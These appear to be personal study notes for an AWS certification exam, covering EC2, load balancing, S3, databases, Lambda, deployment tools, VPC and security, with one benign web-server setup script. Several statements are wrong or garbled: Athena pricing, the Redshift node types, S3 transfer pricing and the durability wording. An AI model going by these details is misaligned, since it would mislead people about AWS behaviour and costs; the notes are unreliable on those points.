build, test and distribute AMIs EC2 Instance Store: High performance hardware disk attached to an ec2, lost if instance is stopped EFS-IA: cost-optimized storage class for infrequent accessed files FSx Linux/Windows: Network file systems for windows and high performance computing file system for LinuxELB &amp;amp; ASG (Elastic Load Balancing &amp;amp; Auto Scaling Groups)Scalability: ability to accommodate a larger load by making the hardware stronger(vertical), or by adding nodes (horizontal)Elasticity: once a system is scalable, elasticity mean that there will be ‘auto scaling’, based on the load, this is cloud friendly : pay per use, match, optimize costsAgility: (not related to scalability), new IT resources are only a click away, it mean that you reduce the time to make those resources available to your developers from weeks to minutesAvailability: goes in hand with horizontal scaling, mean running your application at least in 2 availability zones, the goal is to survive a data center loss (disaster)Elastic Load BalancingLoad balancers are servers that forward internet traffic to multiple servers (EC2 instances) downstreamUse cases: Spread load across multiple downstream instances Expose a single pint of access (DNS) to your application Seamlessly handle failures of downstream instances Do regular health checks to your instances Provide SSL termination (HTTPS) for your websites High availability across zones Is managed by aws It cost less to setup your own load balancer, but it will be a lot more effort on your end (maintenance, integrations)3 kinds of load balancers by AWS: Application load balancer (HTTP/HTTPS) -layer 7 Network load balancer (ultra-high performance, allows for TCP) - layer4 Classic load balancer (slowly retiring) - layer4 &amp;amp;7#!/bin/bash#code for each instanceyum update -yyum install -y httpdsystemctl start httpdsystemctl enable httpdecho &quot;&amp;lt;h1&amp;gt;hello world from $(hostname -f)&amp;lt;/h1&amp;gt;&quot; &amp;gt; /var/www/html/index.htmlAuto Scaling Group In real life, the load on your websites and applications can change In the cloud, you can create and get rid of servers very quickly The goal of an Auto Scaling Group(ASG) is to: Scale out(add ec2 instances) to match an increased load Scale in ( remove ec2 instances) to match a decreased load Ensure we have a maximun and minimun of machines running Replace unhealthy instances Cost saving: only run at an optimal capacity (principle of the cloud)Scaling strategies Manual scaling: Update the size of an ASG manually Dynamic Scaling: Respond to changing demand Simple/step scaling When a cloudwatch alarm is triggered (example CPU&amp;gt;70%) then add 2 units When a washcloth alarm is triggered (example CPU&amp;lt;30%) then remove 1 Target tracking scaling Example: I want the average ASG CPU to stay around 40 Sheduled Scaling Anticipate a scaling based on known usage patterns Ex: Increase the min capacity to 10 at 5pm on fridays Predictive Scaling Uses machine learning to predict future traffic ahead of time Useful when your load has predictable time based patterns Summary Elastic Load Balancer (ELB) Distribute traffic across backend EC2 instances can be Multi-AZ Support health checks 3 types: Application (HTTP-L7), Network(TCP-L4), Classic(old) Auto Scaling Groups (ASG) Implement Elasticity for your application across multiple AZ Scale ec2 instances based on the demand of your system, replace unhealthy Integrated with ELB Amazon S3Amazon S3 Overview Allows people to store objects(files) in buckets(directories) Bucket must have a globally unique name (across all regions all accounts) Buckets are defines at the region level S3 look like a global service but buckets are created in a region Naming convention No uppercase No underscore 3-63 characters long Not an IP Must start with lowercase or number Objects have a key, the key is the FULL path s3://mybucket/myfile.txt The key is composed of prefix + object name s3://mybucket/myfolder/anotherfolder/myfile.txt There is no concept of “directories” within buckets, just keys with very long names that contain slashes(”/”) Object values are the content of the body Max object size is 5TB If uploading more than 5GB, must use “multi-part upload” Not charging for upload data, but you can download 1gb per month, then $0.09 per month Metadata (list of key/value pair) Tags(Unicode key/value pair) VersionID (if versioning is enabled)S3 Security User based: IAM Policies - which API calls should be allowed for specific users from IAM Resource Based; Bucket Policies - bucket wide rules from s3 console- allows cross accounts Note: IAM Principal can access an S3 object if: the user IAM permission allows it OR the resource policy ALLOWS it AND there’s no explicit deny Encryption: you can encrypt objects using encryption keysS3 Bucket Policies JSON based policies: resources:buckets and objects, actions: set of API allow or deny, Effect:allow/deny, Principal:the account to apply the policy on Use cases: grant public access to the bucket, force objects to be encrypted at upload, grant access to another account(cross account)S3 Versioning Its enabled at bucket level Same key overwrite will increment the version Its best practice to version your buckets Protect against unintended deletes (easy roll back) Notes: any file not versioned when versioning have a version “null”, suspending versioning does not delete the previous versionsS3 Access Logs For audit purpose, you may want to log all access to S3 buckets Any request made to S3 will be logged into another S3 bucket That data can be analyzed and view suspicious patterns, etc…S3 Replication (CRR &amp;amp; SRR) Must enable versioning in source and destination bucket Cross Region Replication (CRR) Compliance, lower latency access, replication across accounts Same Region Replication (SRR) Log aggregation, live replication between production and test accounts Buckets can be from different accounts, copying is asynchronous Must give proper IAM permission to S3S3 Storage ClassS3 Durability and Availability Durability: High availability (99.999999..%, 11 9’s) of objects across multiple AZ Same for all storage classes Availability: Measures how readily available a service is S3 Standard has 99.99% availability, which means it will not be available 53 minutes a year S3 Standard - General Purposes 99.99%, used for frequently accessed data Low latency and high throughput Sustain 2 concurrent facility failures Use cases: Big data analytics, mobile, gaming apps, content distributionS3 Standard - Infrequent Access (IA) Suitable for data that is less frequently accessed, but requires rapid access when needed 99.9%, lower cost to S3 standard, but retrieval fee, sustain 2 concurrent facility failures Use cases: As a data store for disaster recovery, backupsS3 One zone - Infrequent Access (IA) Objects are stored in one Availability Zone, 99.5% availability Lower cost compared to S3-IA, the destruction of an AZ could result in the loss of objects stored in that zone. Use cases: Storing secondary backup of on-premise data, or storing data you can recreateS3 Amazon Glacier &amp;amp; Glacier Deep Archive Designed for long-term archiving of object that rarely need to be retrieve, objects are stored using s3 glacier service U can’t retrieve an object in real time, instead you must initiate a restore request for the object and wait until restore is done: Expedited (1-5 min), Standard (3-5 hours), Bulk (5-12 hours) depends on the retrieval options Amazon Glacier deep archive - cheapest: Standard (12 hours), Bulk (48 hours)S3 Intelligent-Tiering 99.9%, same low latency and high throughput performance of S3 standard Cost-optimized by automatically moving objects between two access tiers based on changing access patterns, you’re charged monthly monitoring and automation fee: Frequent access Infrequent access: if object hasn’t been accessed for 30 consecutive days Resilient against events that impact an entire Availability ZoneS3 Glacier Vault Lock S3 Object Lock:Adopt a WORM(Write once read many) model, block an object version deletion for an amount of time Glacier Vault Lock: Adopt a WORM model, lock the policy for future edits, helpful for compliance and data retentionS3 EncryptionAWS Snow Family Highly secure, portable devices to collect and process data at the edge, and migrate data into and out AWS Data migration: snowcone, snowball edge, snowmobile Edge computing: snowcone, snowball edge Tip: If it takes more than a week to transfer over network, use snowball devices!Snow Family - Usage Process Request Snowball devices from AWS console for delivery Install the snowball client/AWS OpsHub on your server Connect the snowball to your servers and copy files using the client Ship back the device when you’re done (goes to the right AWS facility) Data will be loaded into S3 bucket Snowball is completely wipedWhat is Edge Computing? Process data while it’s being created on an Edge location A truck on the road, a ship on the sea, a mining station These locations may have no internet access, no computing power We setup a Snowball Edge/Snowcone device to edge computing to preprocess data, ML at the edge,etc Eventually we can ship back the device to AWS (to transferring data)Snow Family - Edge Computing Snowcone (smaller): 2 CPU, 4gb ram, wired or wireless access Snowball edge (Compute optimized): 52 vCPUs, 208 ram, optional GPU, 42TB Snowball edge (Storage optimized): 40 vCPUs, 80 GB, object clustering All: Can run EC2 Instances &amp;amp; AWS Lambda functions (Using AWS IoT Green grass) Long term deployment options: 1 and 3 years discounted pricesAWS OpsHub Software GUI to manage your snow family device Unlocking clustered devices, transferring files, launching and managing instances, monitor device metrics, launch compatible AWS services on your devices Hybrid Cloud for Storage AWS is pushing for “hybrid cloud”: part on premises and part on the cloud This can be due to: long cloud migrations, security requirements, compliance strategy, IT strategy S3 is a proprietary storage technology (unlike EFS/NFS), so how do you expose S3 data on premise? : AWS Storage GatewayAWS Storage Gateway Hybrid storage service that allow to bridge what happens on premises directly into AWS cloud, using Amazon EBS, S3 and Glacier Use cases: disaster recovery, backup &amp;amp; restoreAmazon S3 - Summary Bucket vs Objects: global unique name, tied to a region S3 security: IAM policy, s3 bucket policy (public access), S3 encryption S3 Websites: host a static web on S3 S3 Versioning: multiple versions for files, prevent accidental deletes S3 Access Logs: save logs from a bucket in another bucket S3 Replication: same region or cross region, must enable versioning and IAM permissions S3 Storage classes: Standard, IA, IZ-IA, Intelligent, Glacier, Glacier Deep Archive S3 Lifecycle Rules: transition objects between classes S3 Glacier Vault Lock/S3 Object Lock: WORM( Write Once Read Many) Snow Family: Import data onto S3 through a physical device, edge computing OpsHub: Desktop software to manage Snow Family devices Storage Gateway: hybrid solution to extend on-premises storage to S3Databases &amp;amp; Analitycs AWS offers use to manage different databases Benefits: Quick Provisioning, High Availability, Vertical and Horizontal Scaling Automated Backup &amp;amp; Restore, Operation Upgrades Operating System Patching is handled by AWS Monitoring, alerting Many databases can run on EC2, but you must handle yourself the resiliency, backup, patching, high availability, fault tolerance, scalingAWS RDS Overview Relational Database Service use SQL as a query languaje It allows you to create databases in the cloud that are managed by AWS: Postgres, MySQL, MariaDB, Oracle, MSQL Server, Aurora(AWS) Advantages using RDS over DB on EC2 RDS is a managed service: Automated provisioning OS patching, continuous backups and restore points Monitoring dashboards, read replicas for improved read perform Multi AZ for Disasters and maintance windows for upgrades Scaling (horizontal and vertical), Storage backed by EBS CON: you can not SSH into your instancesAmazon Aurora Developed by AWS, not open sourced, not free tier PostgreSQL and MySQL are both supported by AuroraDB “AWS Cloud Optimized” and claims 5x performance improvement over MySQL on RDS, and over 3x performance on PostgreSQL on RDS Aurora storage automatically grows of 10GB up to 64TBRDS Deployments: Read Replicas, Multi-AZ Read Replicas: Scale the read workload of your DB Can create up to 5 read replicas Data is only written to the main DB Multi-AZ: Fail over: in case of AZ outage (high availability) Data is only read/written in the main database Can only have 1 other AZ as fail over Multi-Region(Read Replicas): Good for disaster recovery, local performance for global read and replication cost Amazon ElastiCache The same way RDS is to get managed Relational Database Elasticache is to get managed Redis or Memcached Caches are in-memory database with high performance, low latency Helps reduce load off databases for read intensive workloads AWS takes care of OS maintenance, patching, setup, configuration, monitoring recovery and backupsDynamoDB Fully managed key/value database highly available with replication across 3 AZ, minimum of 99,99 percent of availability in a single region NoSQL Database, fast and consistent in performance Scales to massive workloads, distributed serverless database Single-digit millisecond latency, integrated with IAM for security, authorization and administration Low cost and auto scaling capabilities, two pricing models (on demand/provisioned capacity mode)DynamoDB Accelerator - DAX Fully Managed in-memory cache for DynamoDB 10x performance improvement - single- digit millisecond latency to microseconds latency - when accessing your DynamoDB tables Secure,highly scalable and available Note: DAX is only used with DynamoDB and ElastiCache for other databasesDynamoDB - Global Tables Make a Table accessible with low latency in multiple-regions Active-Active replication (Read/Write in any AWS Region)Redshift Based in PostgreSQL, but it’s not used for OLTP It’s OLAP - online analytical processing (analytics and data warehousing) Load every hour, not every second 10x better performance than other data whouses, scale to PBs of data Columnar Storage of data (instead of row based) Massive Parallel Query (MPP), pay as you go on the instances provisioned Has a SQL interface for performing queries BI tools such as AWS Quicksight or Tableau integrate with it Redshift Spectrum can analyze structured data stored in S3 Dense compute node uses magnetic disks (max 326TBs of data) and dense storage nodes use SSDs (max 2PBs of data)Amazon EMR Elastic MapReduce Help creating Hadoop cluster (big data) to analyze and process vast data The clusters can be made of hundreds of EC2 instances Support Apache Spark, HBase, Presto, FLink EMR takes care of all the provisioning and configuration Auto-scaling and integrated with spot instances Use cases: data processing, machine learning, web indexing, big data.Amazon Athena Serverless query service to analyze data stored in Amazon S3 Uses standard SQL language to query the files Supports CSV, JSON, ORC, Avroa and Parquet $5.00 per TB of data stored, use compressed or columnar data for cost-savings (less scan) Use cases: BI, analytics, reporting, analyze &amp;amp; query VPC logs, cloud trail, etcAmazon QuickSight Serverless machine learning-powered business intelligence service to create interactive dashboards Fast automatically scalable, embeddable, with per-session pricing Use cases: Business analytics, building visualizations, perform ad-hoc analysis, get business insights Integrated with RDS, Aurora, Athena, Redshift, S3, …Document DB Aurora is an “AWS implementation” of PostgreSQL or MySQL DocumentDB is the same for MongoDB (No SQL database), also similar implementation of aurora MongoDB is used to store, query and index JSON data Fully managed, highly available with replication across 3AZ Aurora storage automatically grows in increments of 10GB, to 64TB Automatically scales to workloads with millions of request per secondAmazon Neptune Fully managed graph database Popular graph datasets would be a social network Users have friend, post have comments, comment have likes Highly available across 3 AZ, with up to 15 read replicas Build and run application working with highly connected datasets - optimized for these complex and hard queries Can store billions of relations and query the graph with milliseconds of latency Great for knowledge graphs, fraud detection, recommendation engines, social networkAmazon QLDB Quantun Ledger Database is a book recording financial transactions Fully managed, serverless, high available, replication across 3 AZ Used to review history of all the changes made to your application data over time Inmutable system: no entry can be removed or modified, cryptographically verifiable 2-3x better performance than common ledger blockchain framework, manipulate data using SQL QLDB has a central database, in line with many financial regulations rules, in Amazon Managed Blockchain exists decentralizationAmazon Managed Blockchain Blockchain makes possible to build applications where multiple parties can execute transactions without the need for a trusted, central authority Use cases: join public blockchain networks or create your private network, compatible with the frameworks Hyperledger Fabrid &amp;amp; EthereumDMS - Database Migration Service Quickly and securely migrate databases to AWS, resilient, self healing The source database remain available during the migration Supports: Homogeneous migrations or Heterogeneous migrations ( ex: SQL server to Aurora)Summary Relational Database - OLTP: RDS and Aurora (SQL) In- memory database: Elasticache Key/value database: DynamoDB(serverless) &amp;amp; DAX(cache for DynamoDB) Warehouse - OLAP: Redshift (SQL) Hadoop cluster: EMR Athena: query data on Amazon S3 (serverless &amp;amp; SQL) Quicksight: dashboards on your data (serverless) Document DB: “Aurora for Mongo DB” (JSON-NoSQL database) Amazon QLDB: Financial Transactions Ledger (inmutable) Amazon Managed Blockchain: managed Hyperledger Fabric &amp;amp; Ethereum Databases Migration: DMS, and netpune for graph databaseECS, Lamda, Batch, LightsailECS Elastic Container Service, launch docker containers on AWS You must provision &amp;amp; maintain the infrastructure (EC2 instances) AWS takes care of starting and stopping of containers, works with Application Load BalancerFargate Launch Docker containers in AWS **You do not provision the infrastructure ( no EC2 to manage), simpler! Serverless offering, AWS just run container fir you based on CPU-RAM you neddECR Elastic Container Registry Private Docker Registry on AWS, this is where you store your docker images so they can run by ECS or FargateWhat is serverless? New paradigm in which developers don´t manage the server anymore, just deploy code (amazon S3, Dynamo DB, Fargate, Lambda) Serverless was pioneered by AWS Lambda but now also includes databases, messaging, storage, etc Serverless does not mean there are no server, it means you just don’t manage themAWS Lambda Compared to EC2, has virtual functions, this mean no servers to manage Limited by time, short executions, run on-demand and the scaling is automated Easy pricing: pay per request and compute time, free tier of 1 million of Lambda Request and 400GB of compute time Integrated with the whole AWS suite of services Easy monitoring through AWS Cloud Watch, easy to get more resources per functions (up to 10GB of ram) Increasing RAM will also improve CPU and network Languages support: Node.js, python, java, C#, golang, Ruby, Lambda Container image, the container image must implement the lambda runtime APIAWS Lambda Pricing Pay per calls first million request are free, then 0.20 per million request Pay per duration: 400gbs seconds of compute per month are free 400,000 seconds if function is 1GB ram 3200000 seconds if function is 128 MB ram After that $1,00 for 600,000 Gb seconds Usually is very cheap to run AWS Lambda so its very popularAmazon API Gateway Ex: Building a serverless API Fully managed service for developers to easily create, publish, maintain, monitor and secure APIs Serverless and scalable, supports RESTful APIs and WebSocket APIs, security, user auth, API throttling, API keysAWS Batch Fully managed batch processing at any scale A batch job is a job with a start an end, so batch jobs will dynamically launch EC2 Instances or Spot instances AWS Batch provisions the right amount of compute/memory Batch jobs are defined as Docker Images and run on ECSBatch vs Lambda Lambda Time limit, so limited runtime Limited temporary disk space, serverless Batch No limited time, run as long as it’s packaged as a Docker image Rely on EBS/instance store for disk space Relies on EC2 (can be managed by AWS) Amazon Lightsail Virtual servers, storage, databases and networking Low and predictable pricing, simpler alternative to using EC2, RDS, ELB, Route 53 Great for people with little cloud exp, like me! Use cases: simple web apps(Lamps, Nginx, Mean, Node.js), Websites(Wordpress, Magento, Joomla),dev or test environments Has high availability but no auto-scaling, limited AWS integrationsSummary Docker: container technology to run applications ECS: run docker containers on EC2 instances Fargate: run docker without provisioning infrastructure, serverless ECR: private docker images repository Batch: run batch jobs on AWS across managed EC2 Instances Lightsail: predictable &amp;amp; low pricing for simple application &amp;amp; DB stacks Lambda: Serverless, function as a service, seamless scaling, reactive billing:by the time run x by the RAM provisioned, by the number of invocations Languages support: many languages except docker(only with api) Invocation time: up to 15 minutes Use cases: create thumbnails for images uploaded in S3, run a serverless cron job API Gateway: expose Lambda functions as HTTP API Deployments &amp;amp; Managing Infrastructure at ScaleCloudFormation Is a declarative way of outlining your AWS Infrastructure, for any resources Ex: within a CloudFormation template, you say: i want a security group, running two EC2 instances with a load balancer in front of these machines Then CloudFormation crates those for you, in the right order, with the exact configuration that you specify Infrastructure as code No resources are manually created, which is excellent for control Changes to the infrastructure are managed through code Cost You can estimate your cost using CloudFormation template Saving strategy: In Dev, you could automation deletion of templates at 5PM and recreated at 8AM, safely Productivity Ability to destroy and recreate an infrastructure on the cloud on the fly Automate the generation of Diagram for your templates, declarative programming(no need to figure out ordering and orchestration) Support almost all AWS resources, and use “custom resources” for resources that are not supported Stack designer We can see all the resources and the relation between the components AWS Cloud Development Kit (CDK) Define your cloud infrastructure using a familiar language:java script, typescript, python, java and .net The code is compiled into a CloudFormation template (JSON/YAML) You can therefore deploy infrastructure and application runtime code together great for lambda functions and docker containers Typical architecture: Web app 3-tierAWS Elastic Beanstalk Is a developer centric view of deploying an application on AWS Use all components (EC2,ASG,ELB,RDS…) and we have full control over configuration Beanstalk= Platforms as a Service (PaaS) You paying for the underlying instances Managed service: Instance config and os is handled by beanstalk Load balancing and auto scaling, app monitoring and responsiveness Just the application code is responsibility of the developer Three architecture models: Single instance deployment: good for dev LB + ASG: great for production of web apps ASG only: great for non-web apps in production Health Monitoring Health agent pushes metric to CloudWatch Checks for app health, publishes health events AWS CodeDeploy We want to deploy our application automatically Works with EC2, on premise server and Hybrid service Servers/Instances must be provisioned and configured ahead of time with de CodeDeploy AgentAWS CodeCommit Before pushing the app code to servers, it need to be stored somewhere Instead of using Github, AWS provides CodeCommit Make it easy to collaborate with others on code, the code changes automatically versioned Fully managed, scalable &amp;amp; highly available, private, secured and integrated with AWSAWS CodeBuild Compiles source code, run tests and produces packages that are ready to be deployed( by codedeploy for example) Fully managed, serverless, continuosly scalable &amp;amp; highly available, secure, only pay for the build timeAWS CodePipeline Orchestrate the different steps to have the code automatically pushed to production Code → Build → Test → Provision → Deploy Basis for CICD (Continuous Integration &amp;amp; Continuous Delivery) Fully managed, compatible with CodeCommit, CodeBuild,… Fast delivery and rapid updatesAWS CodeArtifact Software packages depend of each others, storing and retrieving these dependencies is called artifact management CodeArtifact is a secure, scalable, and cost-effective artifact management for software development Developers and CodeBuild can then retrieve dependencies straight from CodeArtifactAWS CodeStar Unified UI to easily manage software development activities in one place Quick way yo get started to correctly setup CodeCommit, CodePipeline, Codebuild, Codedeploy, etc Can edit the code in the cloud using AWS Cloud9AWS Cloud9 Is a cloud IDE for writing, running and debugging code A cloud IDE can be used within a web browser, meaning you can work on your projects from your office and has collaboration in real time (pair programming)AWS Systems Manager(SSM) Helps you manage your EC2 and On-Premises systems at scale Another hybrid AWS service, get operational insights about the state of your infra Patching automation for enhanced compliance and run commands across and entire fleet of servers Works with Windows and LInux How works: We need to install SSM on the system we control Installed by default in Amazon LInux AMI &amp;amp; Ubuntu AMI If an instance cant be controlled by SSM it’s probably an issue with the SSM agent. SSM Agents enable us to run commands, patch &amp;amp; configure our servers Systems Manager - SSM Session Manager Allows you to start a secure shell on your EC2 and on-premise servers No SSH access, bastion hosts, or SSH keys needed, no port 22 need (best practice) Support Linux, MacOS, Windows, send session log data to S3 or CloudWatch logs to be more secureAWS OpsWorks Chef and Puppet help you perform server config automatically, or repetitive actions Work great with EC2 and On-Premises VM Alternative to AWS SSM, only provision standard AWS resources (EC2, Databases, Load Balancer, EBS) Chef or Puppet needed → AWS OpsWorksDeployment - Summary Cloud Formation (AWS only): infra as code, works with all AWS resources, repeat across Regions and Accounts Beanstalk (AWS only): platforms as a service, limited to certain programming languages or docker, deploy code with a known architecture (ALB+EC2+RDS) Code Deploy (hybrid): deploy and upgrade any applications onto servers System Manager (hybrid): patch, configure and run commands at scale OpsWorks (hybrid): managed Chef and Puppet in AWS Code commit (store code in git repo), CodeBuild (build and test code in AWS), CodeDeploy (deploy code onto servers), CodePipelines (orchestration of pipeline), CodeArtifact: store software packages, dependencies, Code Star (unified view to quick start of using the other services), Cloud9 (cloud IDE with collab), AWS CDK (define your cloud infrastructure using a programming language)Global Infrastructure On AWS: this could be Regions or Edge Locations Decreased latency: deploy your apps closer to your users to decrease latency Disaster Recovery (DR): you can fail-over another region to have your app still working, increase availability Attack Protection: distributed global infrastructure is harder to attack Regions: For deploying applications and infrastructure Availability Zones: Made of multiply data centers Edge Locations (Points of presence): for content delivery as close as possible to users Global DNS: Route 53: great to route users to the closest deployment, great for disaster recovery strats Global Content Delivery Network (CDN): CloudFront: Replicate part of your apps to AWS Edge locations- decrease latency and cache common requests-improved user experience S3 Transfer Acceleration: Accelerate global uploads and downloads into Amazon S3 AWS Global Accelerator: Improve availability and performance using the AWS networkAmazon Route 53 Managed DNS, collection of rules and record which helps clients understand how to reach server through URLs Routing Policies: simple (no heath checks), weighted (with weights for each server), latency (the lowest latency), failover (based on health check)AWS CloudFront Content Dleivery Network (CDN) Improves read performace, content is cached at the edge 216 point of presecnce (edge locations) DDoS protection, integration with shiel, AWS WAF Origins: S3 bucket: distributing files and caching them at the edge, enhanced security with Origin Access Identity (OAI) Custom Origin (HTTP): application load balancer, ec2 instances, s3 website… CloudFront vs S3 Cross Region Replication CloudFront: Global edge network, files are cached for a TTL Great for static content that must be available everywhere, ex:website) S3 Cross Region Replication: You choose the region you want replication to happen, files are updated in real time (read only) Great for dynamic content that needs to be available at low-latency in few regions S3 Transfer Acceleration Increase transfer speed by transferring file to an AWS edge location which will forward the data of the S3 in the target regionAWS Global Accelerator Improve global application availability and performance using AWS global network 2 Anycast IP are created for you app and traffic is sent through Edge Locations The Edge Location sent the traffic to your appAWS Global Accelerator vs CloudFront They both use AWS global network and it’s edge locations around the world Both using DDoS protection Cloudfront (CDN): improves performance for cacheable content, content is server at the edge Global Accelerator: No caching proxying packets an the edge, good for HTTP that require static IP adressAWS Ouptosts AWS Outposts are “server racks” that offer the same AWS infrastructure, services, APIs and tools to build your own apps on-premises just as in the cloud AWS will setup and manage “outposts racks” within your on-premise infra and you can start leveraging AWS services on-premises You are responsible for the Outposts Rack physical security Benefits:low latency access to on-premise, local data processing, data residency, easier migration to the cloud, fully managed servicesAWS WaveLength Infrastructure deployments embedded within communications providers datacenter at the edge of the 5G networks Bring AWS services to the edge of the 5G networks, ultra low latency through 5G Use cases: smart cities, ML- assisted diagnostics, real time gamingAWS Local Zones Places AWS compute, storage, database closer to end users to run latency-sensitive applications Extend your VPC to more regions, compatible with EC2,RDS,ECS,EBS,… Ex: AWS Regions: N. Virginia (us-east-1), Local Zones: Boston, Chicago, Dallas….Global Application ArchitectureGlobal Applications in AWS - Summary Global DNS: Route 53: route users to the closest deployment, great for disaster recovery strategies Global Content Delivery Network (CDN): Cloudfront: Replicate part of your application to AWS Edge Locations, cache common requests. improve user experience and low latency S3 Transfer Acceleration: Accelerate global uploads and download in Amazon S3 AWS Global Accelerator: Improve global application availability and performance over network AWS Outposts: Deploy outposts racks in your own data center to extend AWS services AWS WaveLenght: Bring AWS to the edge of the 5G networks, ultra low latency AWS Local Zones: Bring AWS resources (compute, storage, database) closer to your users, good for latency.sensitive applicationsCloud Integrations Synchronous communications: app to app ( ex: buying service and shipping service) Asynchronous: app to queue to app If there are sudden spikes of traffic you have to decouple your app using SQS; queue model, SNS:pub/sub model, Kinesis: real-time data streaming modelAmazon SQS - Simple Queue Service Oldest AWS offering, serverless, use to decouple applications Scales from1 to 10,000 messages per second Default retention of 4 days, max of 14 days, no limit how many messages in queue Messages are deleted after the read, low latency(&amp;lt;10 ms on publish and receive)Amazon SNS Simple Notification Service, the “event publishers” only sends message to one SNS topic As many event subscribers as we want to listen to the SNS notifications Each subscriber will get all the messages Up to 10 million subscribers per topic, 100,000 topic limit SNS subscribers can be: http/https, emails, SMS, Mobile notifications, SQS queues, Lambda FunctionsAmazon Kinesis Kinesis= Real time big data streaming Managed service to collect, process and analyze real-time streaming data at any scale Kinesis data firehose: load streams into S3, redshift, elasticsearch… Kinesis data streams: low latency streaming to ingest data at scale from hundreds of sources Kinesis data analytics: perform real time analytics on streams using SQL Kinesis video streams: monitor real time video streams for analytics or MLAmazon MQ Only when need using open protocols on-premise servers : MQTT, AMQP, STOMP, WSS When migrating to the cloud, instead of re-engineering the applicaction to use SQS and SNS, we can use AmazonMQ= Managed Apache ActiveMQ Doesn’t scale as much as SQS/SNS, these are cloud native, and serverless, Amazon MQ run on dedicated machineIntegration Section - Summary SQS:queue service in AWS, multiple producers, messages are kept up to 14 days, used to decouple applications SNS: notifications service in AWS, email, lambda, SQS, HTTP, mobile, multiple subs, send all messages to them, no message retention Kinesis: real time data streaming, persistence and analysis Amazon MQ: managed Apache MQ in the cloud (MQTT, AMQP.. protocols)Cloud MonitoringAmazon CloudWatch Metrics CloudWatch provides metric for every services in AWS Metric have timestamps, can create dashboards Important Metrics: EC2 Instances: cpu utilization, status checks, every 5 minutes, you can pay for detailed monitoring (1min) EBS Volumes: disk read and writes S3 Buckets: total estimated charge(us-east-1) Service Limits: how much you use a service API Custom metrics: push your own metrics Amazon CloudWatch Alarms Trigger notification for any metric Alarms actions: auto scaling: increase o decrease EC2 instances, EC2 actions: stop, terminates, reboot an EC2 instance, SNS Notifications: send a notification into an SNS topic Can choose the period on which to evaluate an alarm Ex: create a billing alarm on cloudwatch billing metric, ALARM STATES: OK, INSUFFICIENT_DATA, ALARMAmazon CloudWatch Logs CloudWatch Logs can collect logs from:Elastic Beanstalk, ECS, Lambda, Cloud trail, Route53 Enables real-time monitoring of logs Adjustable CloudWatch Logs retentionCloud Watch Logs for EC2 By default, no logs from EC2 instance will go to CloudWatch You need to run a CloudWatch agent on EC2 to push the log files you want The CloudWatch Log agent can be setup on-premises too and make sure IAM permissions are correctAmazon EventBridge EventBridge is the next evolution of CloudWatch Events Default event bus. generated by AWS services (CloudWatch Events) Partner event bus. receive events from SaaS service or apps Custom Event Buses: for your own applications Schema Registry: model event schema EventBridge has a different name to mark the new capabilities The cloudWatch events name will be replaced with EventBridgeAWS Cloud Trail Enabled by default and provides governance, compliance and audit for your AWS Account Gets an history of events or API calls made in your AWS Account by: console, SDK, CLI, AWS Services You can put these logs into CloudWatch logs or S3, and a trail can be applied to all regions(default) or a single one, if a resource is deleted investigate cloud trail firstCloud Trail Events Management events: operations that a principal (user or service) attempts to execute against an AWS resource. this include write-only events (create ec2) and read only events (list ec2 instances) Data events: consist of S3 object-level activity and lambda functions executions, both of which tend to be a high volume, CloudTrail draw a distinction to S3 events, read only(get-object) and write only(put object)Cloud Trail Events Retention Events are stored for 90 days in CloudTrail To keep events beyond this period, log them to S3 and use athenaAWS X-Ray Debugging in Production, old way: test locally, add log everywhere, re-deploy in production Debugging: one big monolith “easy”, distributed services “hard” No common views of your entire architecture Use cases: Troubleshooting performance Understand dependencies in a microservice architecture Review request behavior, find error and exceptions Where i am throttled, identify users that are impacted Amazon CodeGuru ML-powered service for automated code reviews and application performance recommendations Two functions: CodeGuru Reviewer: automate code reviews for static code analysis CodeGuru Profiler: visibility or recommendation about application performance during runtime CodeGuru Reviewer Identify critical issues, security vulnerabilities, and hard-to-find bugs Ex: common coding best practices, resource leaks, security detection, input validation Using ML and automated reasoning, supports Java and Python, integrated with GitHub, AWS CodeCommit and BitBucketCodeGuru Profiler Helps understand the runtime behavior of your application Ex: too much CPU usage Support apps running on AWS or on-premise and minimal overhead of applicationAWS Personal Health Dashboard Provides alerts and remediation guidance when AWS is experiencing event that affect you Alert, remediation, proactive notifications, scheduled activitiesMonitoring Summary CloudWatch Metrics: monitor the performance of AWS service and billing metrics Alarms: automate notification, perform EC2 action, notify SNS based on metric Logs: collect log files from EC2 instances, lambda functions EventBridge: react to events in AWS or trigger a rule on schedule CloudTrail: audit API calls made within your AWS account CloudTrail Insights: automated analysis of your cloudtrail events Amazon CodeGuru: automated code reviews and application performance recommendationsVPC Virtual Private Cloud: private network to deploy your resources (regional) Subnets: allow you to partition your network inside your VPC (AZ resource) Public Subnet: is accessible from the internet Private Subnet: is not accessible from the internet To define access to the internet and between subnets, we use Route TablesNetwork ACL and Security GroupsVPC Flow Logs Capture Information about IP traffic going into your interfaces VPC, Subnet, Elastic Network Interface Helps to monitor and troubleshoot connectivity issues VPC Flow logs data can go to S3 or CloudWatch LogsVPC Peering Connect two VPC, privately using AWS network Make them behave if they were in the same network Not transitive, must be established for each VPC that need to communicateVPC Endpoints Allow you to connect to AWS Services using a private network instead of public network Enhanced security and low latency VPC Endpoint Gateway(S3 and DynamoDB), Interface (the rest)Site to Site VPN &amp;amp; Direct Connect Site to site VPN; connect an on-premise VPN to AWS, automatically encrypted, goes over public network Customer Gateway (on-premise), virtual private gateway (AWS) Direct Connect(DX): establish physical connection between on-premises and AWS, goes over private network takes a month to establishTransit Gateway For having transitive peering between thousands of VPC and on-premises One single gateway to provide this functionality, works with direct connect gateway, VPN connectionsVPC Summary Subnets: Tied to an AZ, network partition of the VPC Internet Gateway: at the VPC level, provide internet access Nat Gateway: give internet to private subnets NACL: Stateless, subnet rules for inbound and outbound Security Groups: Stateful, operate at the EC2 level or ENI VPC peering: connect two VPC with no overlapping IP ranges, no transitive VPC Endpoints: Provide private access to AWS Services within VPC VPC Flowlogs. network traffic logs Site to site VPN: VPN over public network between premises DC and AWS Direct Connect: direct private connection to AWS Transit Gateway: Connect thousands of VPC and on-premises networks togetherSecurity &amp;amp; Compliance AWS responsibility: Security of the cloud Protecting infrastructure Managed services like S3, DynamoDB, RDS Customer Responsibility: Security in the cloud Guest OS(security patches and updates) Firewall and network configuration, IAM and encrypting data Shared Controls: Patch Management, Configuration management, Awareness &amp;amp; TrainingDDOS Protection on AWSAWS Shield AWS Shield Standard: protect against DDoS attack for your website and applications, for all customers at no adittional costs AWS Shield Advanced: 24/7 premium DDoS protection (3k usd per month) AWS WAF: Filter specific requests based on rules CloudFront and Route53: availability protection using global edge network, combined with AWS shield provides solid mitigation 